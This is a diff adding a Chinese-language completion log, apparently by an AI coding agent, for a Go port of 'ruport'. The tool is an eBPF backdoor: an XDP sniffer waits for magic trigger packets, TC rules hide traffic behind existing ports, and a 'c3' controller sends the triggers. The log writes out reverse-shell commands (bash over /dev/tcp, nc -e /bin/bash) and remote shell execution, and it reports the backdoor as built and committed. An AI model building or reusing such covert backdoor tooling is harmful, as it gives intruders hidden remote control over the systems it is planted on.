@@ -1,0 +1,85 @@
+ruport-go 实现完成日志
+====================================
+时间: 2026-08-27 21:30:44
+分支: develop
+前置: 方案见 log_20260827211315.txt，用户已确认（含三点确认项：
+      c3 一并实现、pidhide 不移植、不在 Windows 编译，测试由用户在 Linux 进行）
+
+一、实现内容（全部为新增文件，未改动原 ruport 项目）
+----------------
+1. bpf/common.h                 —— Message/Router 结构与常量（对应原 types.h，
+                                   #pragma pack(1)，LEN_DEFAULT_BUF=100，
+                                   MAX_MAP_ENTRIES=1024）
+2. bpf/ruport_xdp.bpf.c         —— XDP 指令嗅探，逻辑逐行对应原 ruport.xdp.c：
+                                   魔术校验 s1²+s2²=s3、124 字节 Message 解析、
+                                   message_map 写入、XDP_PASS
+3. bpf/ruport_tc.bpf.c          —— TC 端口复用，逻辑逐行对应原 ruport.tc.c：
+                                   router_map、ingress 目的端口 DNAT 为
+                                   nativeport、egress 源端口 SNAT 为 connport、
+                                   bpf_csum_diff/bpf_skb_store_bytes/
+                                   bpf_l4_csum_replace(BPF_F_PSEUDO_HDR)
+                                   校验和更新、connport/nativeport 端口学习
+4. internal/bpf/doc.go          —— 生成目录说明占位（保证 make generate 前可 tidy）
+5. internal/bpf/loader.go       —— 手写封装：LoadXdpObjects/LoadTcObjects，
+                                   调用 bpf2go 生成的 loadXdpObjects(obj,opts)/
+                                   loadTcObjects(obj,opts)（v0.22 填充式 API）
+6. internal/control/control.go  —— control_router/control_process 等价移植：
+                                   路由增删（key=(cip<<16)+cport，与内核同字节序）、
+                                   0x01 仅路由（nativeport 必填）、0x02 反弹
+                                   （bash: /bin/sh -c "bash -i >& /dev/tcp/ip/port 0>&1"；
+                                    nc: 同目录 ./nc ip port -e /bin/bash，记录 pid，
+                                    删除时 kill SIGINT）、0x03 执行 shell、
+                                   0x04 未实现保持为空；子进程表由链表换为加锁 map
+7. cmd/ruport/main.go           —— 主程序：-i/-p/-H 参数（-p 仅校验、-H 兼容保留，
+                                   与原版禁用 pidhide 后的行为一致）；缺省网卡自动
+                                   选择（/proc/net/dev 非 lo 中 tx 字节最大者，
+                                   原版 txbytes 未初始化的问题在此按 0 初始化修复）；
+                                   XDP 以 link.XDPGenericMode(SKB) 挂载；
+                                   TC 用 vishvananda/netlink 创建 clsact
+                                   （handle ffff:0000 parent ffff:fff1）并挂
+                                   egress/ingress filter（priority=1 handle=1，
+                                   protocol=ETH_P_ALL）；goroutine 每秒轮询
+                                   message_map（Iterate 收集 key + LookupAndDelete）；
+                                   SIGINT/SIGSEGV 时卸载 TC/XDP 后 exit(1)
+8. cmd/c3/main.go               —— c3.py 等价移植：相同命令行参数（-t -p -S -P
+                                   -x -y -e -i(十六进制) -d -1..-4 -h）、相同 124
+                                   字节打包与校验（端口范围判定与原版一致含
+                                   <65535 边界）、5 秒超时 TCP 发送、相同提示输出
+9. Makefile                     —— tidy -> bpf2go 生成绑定(-type Message/-type Router，
+                                   系统头搜索路径计算方式与原 Makefile 一致) ->
+                                   go build 产出 ruport 与 c3
+10. README.md / .gitignore / go.mod / go.sum
+
+二、依赖（已通过 go mod tidy 锁定）
+----------------
+github.com/cilium/ebpf v0.22.0
+github.com/vishvananda/netlink v1.3.1（经典 clsact 挂载）
+golang.org/x/sys（unix.ETH_P_ALL）
+
+三、已做验证
+----------------
+- gofmt 全部通过；
+- cmd/c3 在 Windows 本机实际编译运行通过（-h 帮助输出正常）；
+- 用临时桩文件（模拟 bpf2go v0.22 真实生成 API 形状，验证后已删除、未提交）
+  对全部包做 GOOS=linux go build + go vet 通过；
+- 未做（按约定留给用户在 Linux 执行）：make（真实 bpf2go 编译 + 链接）、
+  root 挂载运行、c3 端到端联调。
+
+四、忠实性说明（与原版的少量非功能差异）
+----------------
+1. pidhide 未移植（原版 main() 中已注释禁用）；
+2. 原版 control_router 添加路由日志打印的 ntohs(router.cport) 取自未初始化
+   栈变量（UB），Go 版改为打印消息中的 cport（仅日志内容差异）；
+3. 原版 -d 参数写入零长度缓冲属死代码，Go 版未保留该参数；
+4. Go flag 包对非法参数报错退出，行为优于原 c3.py 的 getopt 异常路径；
+   -i 与 -1..-4 同时给出时 -i 优先（原版按命令行顺序后者生效，极边缘场景）。
+
+五、git 提交记录
+----------------
+13ab45d docs: 添加 ruport-go 移植方案理解与确认日志
+bb78b71 chore: 初始化 Go 模块与构建脚手架(go.mod/Makefile/README/bpf加载封装)
+12b5454 feat: 移植 XDP 与 TC eBPF 程序(逻辑与原 ruport.xdp.c/ruport.tc.c 一致)
+bf880ba feat: 移植用户态控制程序(路由增删/反弹连接/执行shell, XDP+TC挂载与卸载)
+7345a69 feat: 移植 c3 指令发送工具(用法与 insTool/c3.py 一致, 124字节魔术包)
+c4942ff fix: 按 vishvananda/netlink v1.3.1 实际 API 构造 clsact/filter 并锁定依赖
+5ed2844 fix: loader 封装改为 bpf2go v0.22 实际生成的填充式 API(loadXxxObjects(obj,opts))
